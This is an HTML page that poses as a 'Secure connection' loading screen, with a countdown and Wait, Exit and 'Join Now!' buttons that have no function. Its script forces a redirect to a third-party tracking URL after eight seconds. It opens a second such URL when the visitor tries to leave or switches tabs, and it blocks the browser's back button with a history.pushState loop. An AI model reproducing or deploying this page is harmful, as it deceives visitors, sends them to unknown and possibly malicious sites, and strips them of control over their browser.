<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure connection</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    /* Video nền */
    #bg-video {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: -2;
    }

    /* Lớp mờ trắng */
    body::before {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background-color: rgba(255, 255, 255, );
      z-index: -1;
    }

    .box {
      background: white;
      padding: 30px 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      max-width: 90%;
      width: 400px;
      position: relative;
      z-index: 1;
    }

    h1 {
      color: #1877f2;
      font-size: 22px;
      margin-bottom: 10px;
    }

    p {
      font-size: 18px;
      color: #333;
      margin-bottom: 20px;
    }

    #countdown {
      font-weight: bold;
      color: #ff4444;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 16px;
      margin: 10px 0;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.7s;
    }

    .wait-btn { background-color: #4CAF50; color: white; }
    .wait-btn:hover { background-color: #45a049; }

    .exit-btn { background-color: #f44336; color: white; }
    .exit-btn:hover { background-color: #d73833; }

    .join-btn { background-color: #1877f2; color: white; }
    .join-btn:hover { background-color: #155fd1; }

    @media (max-width: 480px) {
      .btn {
        font-size: 16px;
        padding: 14px;
      }
    }
  </style>
</head>
<body>
  <!-- Video nền -->
  <video id="bg-video" autoplay muted loop playsinline>
    <source src="https://www.pexels.com/vi-vn/download/video/8306739/">
  </video>

  <div class="box">
    <h1>Connecting...</h1>
    <p>waiting... <span id="countdown">8</span> giây</p>
    <button class="btn wait-btn">Wait</button>
    <button class="btn exit-btn">Exit</button>
    <button class="btn join-btn">Join Now!</button>
  </div>

  <script>
    const link4 = "https://seventhdisdainunlucky.com/nj20tm104e?key=ef104419bfd2d0cc6ef0175645e109e3";
    const fallbackPopup = "https://seventhdisdainunlucky.com/ehsj873i?key=b34cc7c4ee8b77a145388ddd572011cd";

    function openMultiplePopups(links) {
      links.forEach(link => window.open(link, "_blank"));
    }

    let countdown = 8;
    const countdownEl = document.getElementById("countdown");

    const timer = setInterval(() => {
      countdown--;
      countdownEl.textContent = countdown;
      if (countdown <= 0) {
        clearInterval(timer);
        window.location.href = link4;
      }
    }, 1000);

    let popupShown = false;
    document.addEventListener("mouseout", function (e) {
      if (e.clientY <= 0 && !popupShown && e.relatedTarget === null) {
        popupShown = true;
        window.open(fallbackPopup, "_blank");
      }
    });

    document.addEventListener("visibilitychange", function () {
      if (document.visibilityState === 'hidden' && !popupShown) {
        popupShown = true;
        window.open(fallbackPopup, "_blank");
      }
    });

    history.pushState(null, null, location.href);
    window.onpopstate = function () {
      history.pushState(null, null, location.href);
    };
  </script>
</body>
</html>
